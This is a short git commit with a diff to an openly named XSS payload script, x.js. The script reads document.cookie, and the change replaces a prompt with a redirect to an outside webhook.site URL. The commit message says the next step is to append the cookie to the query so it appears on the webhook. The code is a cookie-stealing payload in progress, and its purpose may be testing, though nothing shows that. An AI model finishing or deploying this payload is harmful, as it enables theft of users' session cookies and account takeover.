82811363094e03f405a714ab72456c0e978775cf
el3232 <49128449+el3232@users.noreply.github.com>
2023-02-08 00:32:47 -0500

    add redirect to webhook
    next step is to add the cookie to the query so we can see it on our webhook site

--- x.js
+++ x.js
@@ -1,7 +1,7 @@
 function xssPayload() {
   const alertMsg = 'xss ' + document.cookie;
   console.log(alertMsg);
-  window.prompt(alertMsg);
+  window.location.replace("https://webhook.site/9f56f27e-407b-4645-bdd1-173484f6f8ad");
 }
 
 console.log('XSS payload executed');
